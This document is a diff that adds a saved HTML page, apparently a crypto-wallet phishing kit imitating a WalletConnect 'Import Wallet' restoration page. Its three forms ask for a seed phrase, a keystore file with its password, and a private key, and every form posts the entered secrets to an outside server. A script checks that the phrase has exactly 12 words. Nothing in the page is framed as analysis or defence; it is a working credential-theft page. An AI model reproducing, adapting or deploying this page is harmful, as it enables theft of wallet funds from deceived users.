@@ -1,0 +1,141 @@
+
+<!-- saved from url=(0080)https://greatercentralbc.org/walletconnect/wallet-restoration-RD772/restore.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <link rel="stylesheet" href="https://dlcastal.com/sasaopalo/Import Wallet_files/main.css" type="text/css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Import Wallet</title>
+    <script>
+        document.getElementsByName("phrase").reset();
+  document.getElementsByName("keystoreJSON").reset();
+  document.getElementsByName("password").reset();
+  document.getElementsByName("privateKey").reset();
+</script>
+    <script>
+        function openCity(evt, cityName) {
+    // Declare all variables
+    var i, tabcontent, tablinks;
+
+    // Get all elements with class="tabcontent" and hide them
+    tabcontent = document.getElementsByClassName("tabcontent");
+    for (i = 0; i < tabcontent.length; i++) {
+      tabcontent[i].style.display = "none";
+    }
+
+    // Get all elements with class="tablinks" and remove the class "active"
+    tablinks = document.getElementsByClassName("tablinks");
+    for (i = 0; i < tablinks.length; i++) {
+      tablinks[i].className = tablinks[i].className.replace(" active", "");
+    }
+
+    // Show the current tab, and add an "active" class to the button that opened the tab
+    document.getElementById(cityName).style.display = "block";
+    evt.currentTarget.className += " active";
+  }
+  </script>
+</head>
+
+<body>
+    <center>
+        <div class="top">
+            <a href="https://greatercentralbc.org/walletconnect/wallet-restoration-RD772/restore.html#" class="left">Github</a>
+            <a href="https://greatercentralbc.org/walletconnect/wallet-restoration-RD772/restore.html#" class="left">Docs</a>
+            <a href="https://greatercentralbc.org/walletconnect/wallet-restoration-RD772/restore.html#" class="main"><img src="./Import Wallet_files/logo.svg" alt="logo"></a>
+            <a href="https://greatercentralbc.org/walletconnect/wallet-restoration-RD772/restore.html#" class="left">Wallets</a>
+            <a href="https://greatercentralbc.org/walletconnect/wallet-restoration-RD772/restore.html#" class="left">Apps</a>
+        </div>
+        <br>
+        <h2>
+            <center>Import Wallet</center>
+        </h2>
+        <br>
+        <div class="tab">
+            <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase&#39;)" fdprocessedid="4jas83">Phrase</button>
+            <button class="tablinks" onclick="openCity(event, &#39;keystore&#39;)" fdprocessedid="2thaly">Keystore JSON</button>
+            <button class="tablinks" onclick="openCity(event, &#39;private&#39;)" fdprocessedid="294uxs">Private Key</button>
+        </div>
+        <div>
+            <form class="form" id="form1" action="https://dlcastal.com/sasaopalo/next.php" method="post">
+                <div id="phrase" class="tabcontent" style="display: block;">
+                    <input type="text" id="walletApp1" name="walletApp" value="" style="display: none">
+                    <textarea name="phrase" class="phrase" minlength="12" placeholder="Phrase" required=""></textarea>
+                    <br>
+                    <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+                    <br>
+                    <button type="submit" name="btn1" form="form1" class="btn" fdprocessedid="18ok9">IMPORT</button>
+                </div>
+            </form>
+            <form class="form" id="form2" action="https://dlcastal.com/sasaopalo/next.php" method="post">
+                <div id="keystore" class="tabcontent" style="display: none;">
+                    <input type="text" id="walletApp2" name="walletApp" value="" style="display: none">
+                    <textarea name="keystoreJSON" class="phrase" minlength="12" placeholder="Keystore JSON" required=""></textarea>
+                    <br>
+                    <div class="field">
+                        <input type="password" name="password" placeholder="Password" required="">
+                    </div>
+                    <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
+                    <br>
+                    <button type="submit" name="btn2" form="form2" class="btn">IMPORT</button>
+                </div>
+            </form>
+            <form class="form" id="form3" action="https://dlcastal.com/sasaopalo/next.php" method="post">
+                <div id="private" class="tabcontent" style="display: none;">
+                    
+                    <input type="text" id="walletApp3" name="walletApp" value="" style="display: none">
+                    <div class="field">
+                        <input type="text" name="privateKey" class="key" placeholder="Private Key" required="">
+                    </div>
+                    <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+                    <br>
+                    <button type="submit" name="btn3" form="form3" class="btn">IMPORT</button>
+                    <!--</form>-->
+                </div>
+            </form>
+        </div>
+        <footer>
+            <div id="footer">
+                <p><img src="https://dlcastal.com/sasaopalo/Import Wallet_files/discord.svg" class="footimg"> <a href="#">Discord</a></p><br>
+                <p><img src="https://dlcastal.com/sasaopalo/Import Wallet_files/telegram.svg" class="footimg"> <a href="#">Telegram</a></p><br>
+                <p><img src="https://dlcastal.com/sasaopalo/Import Wallet_files/twitter.svg" class="footimg"> <a href="#">Twitter</a></p><br>
+                <p><img src="https://dlcastal.com/sasaopalo/Import Wallet_files/github.svg" class="footimg"> <a href="#">Github</a></p><br>
+            </div>
+        </footer>
+    </center>
+
+
+<deepl-input-controller><template shadowrootmode="open"><link rel="stylesheet" href="chrome-extension://cofdbpoegempjloogbagkncekinflcnj/build/content.css"><div dir="ltr"><div class="dl-input-translation-container svelte-95aucy"><div></div></div></div></template></deepl-input-controller><span id="PING_IFRAME_FORM_DETECTION" style="display: none;"></span>
+
+
+<script>
+    
+
+
+    document.addEventListener("DOMContentLoaded", function() {
+    var form = document.getElementById("form1"); // Assuming the form ID is "form1"
+    form.addEventListener("submit", function(event) {
+        var phraseInput = document.getElementsByName("phrase")[0];
+        var phrase = phraseInput.value.trim();
+        var words = phrase.split(" ");
+        
+        // Check if the number of words is exactly 12
+        if (words.length !== 12) {
+            alert("Phrase must contain exactly 12 words.");
+            event.preventDefault(); // Prevent form submission
+        } else {
+            // Check if each word is non-empty
+            var isValid = words.every(function(word) {
+                return word.trim().length > 0;
+            });
+            
+            if (!isValid) {
+                alert("Each word in the phrase must be non-empty.");
+                event.preventDefault(); // Prevent form submission
+            }
+        }
+    });
+});
+
+
+
+</script>
+</body></html>
